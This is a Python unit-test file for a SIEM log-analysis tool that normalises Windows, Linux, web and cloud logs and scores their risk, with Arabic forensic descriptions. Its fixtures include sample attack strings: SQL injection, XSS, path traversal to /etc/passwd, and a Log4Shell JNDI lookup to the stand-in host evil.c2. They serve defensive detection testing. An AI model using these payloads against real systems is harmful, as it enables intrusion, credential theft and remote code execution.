"""Unit tests for universal ManageEngine / SIEM log ingestion, Arabic forensics, and risk scoring."""

import unittest
from logscope.analyzer import (
    normalize_events,
    score_event_risk,
    calculate_risk,
    _forensic_threat_explanation,
    WINDOWS_EVENT_DESCRIPTIONS_AR,
    WINDOWS_LOGON_SUBSTATUS_AR,
    WINDOWS_LOGON_TYPES_AR,
)
from logscope.file_parser import ParsedData


class UniversalLogScopeTests(unittest.TestCase):
    """Test ingestion, normalization, and Arabic forensics across diverse SIEM log sources."""

    def test_windows_active_directory_adaudit_export(self):
        """Verify ADAudit Plus / EventLog Analyzer Windows Security log format."""
        headers = ["TimeCreated", "EventCode", "TargetUserName", "ClientIP", "LogonType", "SubStatus", "Message"]
        rows = [
            # 4625 Failed Logon with bad password (0xC000006A) via RDP (Type 10)
            ["2026-09-02 10:15:30", "4625", "Administrator", "192.168.1.100", "10", "0xC000006A", "An account failed to log on."],
            # 4625 Failed Logon with non-existent user (0xC0000064 - User Enumeration)
            ["2026-09-02 10:15:35", "4625", "fake_user_99", "192.168.1.100", "3", "0xC0000064", "An account failed to log on."],
            # 4624 Successful Logon via RDP (Type 10)
            ["2026-09-02 10:16:00", "4624", "backup_admin", "192.168.1.50", "10", "0x0", "An account was successfully logged on."],
            # 1102 Audit Log Cleared (Anti-forensics)
            ["2026-09-02 10:17:00", "1102", "System", "127.0.0.1", "", "", "The audit log was cleared."],
            # 4728 Added to privileged group (Domain Admins)
            ["2026-09-02 10:18:00", "4728", "hacker_account", "10.0.0.5", "", "", "A member was added to a security-enabled global group."],
        ]
        parsed = ParsedData(filename="test.csv", headers=headers, rows=rows, source_format="csv", total_rows=len(rows))
        events = list(normalize_events(parsed))

        self.assertEqual(len(events), 5)

        # Event 0: Failed Logon (Bad password)
        e0 = events[0]
        self.assertEqual(e0.event_id, "4625")
        self.assertEqual(e0.user_account, "Administrator")
        self.assertEqual(e0.src_ip, "192.168.1.100")
        self.assertIn("كلمة المرور غير صحيحة", e0.description_ar)
        self.assertIn("سطح مكتب بعيد", e0.description_ar)
        self.assertIn("وصول أولي", e0.threat_family)

        # Event 1: Failed Logon (User does not exist)
        e1 = events[1]
        self.assertIn("اسم المستخدم غير موجود", e1.description_ar)

        # Event 2: Successful RDP
        e2 = events[2]
        self.assertEqual(e2.event_id, "4624")
        self.assertIn("سطح مكتب بعيد", e2.description_ar)

        # Event 3: 1102 Audit Log Cleared
        e3 = events[3]
        self.assertEqual(e3.event_id, "1102")
        self.assertIn("مسح وتفريغ سجل التدقيق الأمني", e3.description_ar)
        self.assertGreaterEqual(score_event_risk(e3), 90)

        # Event 4: 4728 Privilege Escalation
        e4 = events[4]
        self.assertEqual(e4.event_id, "4728")
        self.assertIn("تصعيد امتيازات", e4.description_ar)
        self.assertGreaterEqual(score_event_risk(e4), 75)

    def test_linux_syslog_ssh_and_sudo_auditing(self):
        """Verify Linux auth.log / syslog format for SSH and sudo attacks."""
        headers = ["timestamp", "hostname", "process_name", "message", "action"]
        rows = [
            ["Sep 2 14:20:01", "srv-linux-01", "sshd", "Failed password for invalid user admin from 203.0.113.50 port 44211 ssh2", "block"],
            ["Sep 2 14:20:05", "srv-linux-01", "sshd", "Accepted publickey for deployer from 192.168.1.20 port 51222 ssh2", "allow"],
            ["Sep 2 14:21:00", "srv-linux-01", "sudo", "pam_unix(sudo:auth): authentication failure; logname=john uid=1001 euid=0", "deny"],
            ["Sep 2 14:22:00", "srv-linux-01", "crontab", "crontab(root) replace /tmp/backdoor_cron", "alert"],
        ]
        parsed = ParsedData(filename="test.csv", headers=headers, rows=rows, source_format="csv", total_rows=len(rows))
        events = list(normalize_events(parsed))

        self.assertEqual(len(events), 4)

        # SSH failed login
        e0 = events[0]
        self.assertIn("محاولة فاشلة لتسجيل الدخول إلى خادم Linux", e0.description_ar)
        self.assertIn("203.0.113.50", e0.extracted_ips)
        self.assertEqual(e0.action_ar, "حظر (BLOCK)")

        # SSH accepted login
        e1 = events[1]
        self.assertIn("تسجيل دخول ناجح إلى خادم Linux", e1.description_ar)
        self.assertEqual(e1.action_ar, "سماح (ALLOW)")

        # Sudo failure
        e2 = events[2]
        self.assertIn("فشل مصادقة كلمة المرور أثناء محاولة استخدام صلاحيات المسؤول sudo", e2.description_ar)
        self.assertIn("تصعيد صلاحيات", e2.threat_family)

        # Crontab persistence
        e3 = events[3]
        self.assertIn("تعديل مهام الجدولة Cron", e3.description_ar)
        self.assertIn("ترسيخ التواجد", e3.threat_family)

    def test_web_application_owasp_and_waf_attacks(self):
        """Verify Web Server / WAF access log attack signatures."""
        headers = ["time", "c-ip", "cs-method", "cs-uri-stem", "sc-status", "action_taken"]
        rows = [
            ["2026-09-02 15:00:00", "198.51.100.10", "GET", "/products.php?id=1 UNION SELECT 1,username,password FROM users--", "200", "allow"],
            ["2026-09-02 15:01:00", "198.51.100.11", "POST", "/search?q=<script>alert('xss')</script>", "403", "block"],
            ["2026-09-02 15:02:00", "198.51.100.12", "GET", "/view?file=../../../../etc/passwd", "403", "drop"],
            ["2026-09-02 15:03:00", "198.51.100.13", "POST", "/api/log?user=${jndi:ldap://evil.c2/a}", "400", "blocked"],
        ]
        parsed = ParsedData(filename="test.csv", headers=headers, rows=rows, source_format="csv", total_rows=len(rows))
        events = list(normalize_events(parsed))

        self.assertEqual(len(events), 4)

        # SQLi allowed -> very high risk!
        e0 = events[0]
        self.assertIn("حقن قواعد البيانات SQL Injection", e0.description_ar)
        self.assertIn("حقن SQL", e0.threat_family)
        score0 = score_event_risk(e0)
        self.assertGreaterEqual(score0, 85)

        # XSS
        e1 = events[1]
        self.assertIn("البرمجة النصية عبر المواقع Cross-Site Scripting", e1.description_ar)

        # Path Traversal
        e2 = events[2]
        self.assertIn("تجاوز المسار وقراءة ملفات النظام", e2.description_ar)

        # Log4j
        e3 = events[3]
        self.assertIn("Log4Shell", e3.description_ar)
        self.assertGreaterEqual(score_event_risk(e3), 75)

    def test_cloud_and_database_auditing(self):
        """Verify Cloud Identity (M365/Azure AD) and Database activity logs."""
        headers = ["DateTime", "Account", "SourceIP", "Operation", "Details", "Status"]
        rows = [
            ["2026-09-02 16:00:00", "sarah@corp.com", "185.220.101.5", "UserLogin", "Impossible travel detected from Russia and USA in 5 minutes", "Alert"],
            ["2026-09-02 16:05:00", "finance@corp.com", "10.0.1.20", "MailboxRule", "New mailbox forwarding rule created to external address", "Success"],
            ["2026-09-02 16:10:00", "db_app", "172.16.0.40", "ExecuteQuery", "DROP TABLE Customers;", "Success"],
        ]
        parsed = ParsedData(filename="test.csv", headers=headers, rows=rows, source_format="csv", total_rows=len(rows))
        events = list(normalize_events(parsed))

        self.assertEqual(len(events), 3)

        # Impossible travel
        e0 = events[0]
        self.assertIn("تسجيل دخول مستحيل جغرافياً", e0.description_ar)
        self.assertIn("دخول مستحيل جغرافياً", e0.threat_family)

        # BEC Forwarding Rule
        e1 = events[1]
        self.assertIn("إعادة توجيه بريد إلكتروني", e1.description_ar)
        self.assertIn("توجيه بريد إلكتروني", e1.threat_family)

        # Drop Table
        e2 = events[2]
        self.assertIn("حذف جدول أو قاعدة بيانات", e2.description_ar)
        self.assertIn("حذف جداول قواعد البيانات", e2.threat_family)

    def test_streaming_and_risk_scoring_performance(self):
        """Verify that streaming through thousands of events completes with high speed and low memory."""
        import time

        total_rows = 5000
        headers = ["Date", "Event ID", "Source IP", "Destination IP", "Action", "Message"]
        # Generate 5,000 synthetic rows with various attack types
        def row_generator():
            for i in range(total_rows):
                if i % 5 == 0:
                    yield ["2026-09-02 12:00:00", "4625", f"192.168.1.{i % 250}", "10.0.0.1", "Deny", "0xC000006A Logon Type 10"]
                elif i % 5 == 1:
                    yield ["2026-09-02 12:00:01", "1102", "127.0.0.1", "127.0.0.1", "Alert", "Audit log cleared"]
                elif i % 5 == 2:
                    yield ["2026-09-02 12:00:02", "", f"10.10.1.{i % 250}", "10.0.0.2", "Block", "Expiro: bad-domain.com virus connection"]
                elif i % 5 == 3:
                    yield ["2026-09-02 12:00:03", "", f"172.16.1.{i % 250}", "10.0.0.3", "Allow", "GET /test?id=1 UNION SELECT 1,2--"]
                else:
                    yield ["2026-09-02 12:00:04", "4624", f"192.168.1.{i % 250}", "10.0.0.1", "Permit", "Logon Type 3"]

        parsed = ParsedData(filename="test.csv", headers=headers, rows=row_generator(), source_format="csv", total_rows=total_rows)
        
        t0 = time.perf_counter()
        normalized_stream = normalize_events(parsed)
        scored_stream = calculate_risk(normalized_stream, total_events=total_rows)
        processed_count = sum(1 for _ in scored_stream)
        elapsed = time.perf_counter() - t0

        self.assertEqual(processed_count, total_rows)
        # Should process 5,000 records in under 6.0 seconds!
        self.assertLess(elapsed, 6.0, f"Processing {total_rows} events took {elapsed:.2f}s, expected < 6.0s")


if __name__ == "__main__":
    unittest.main()
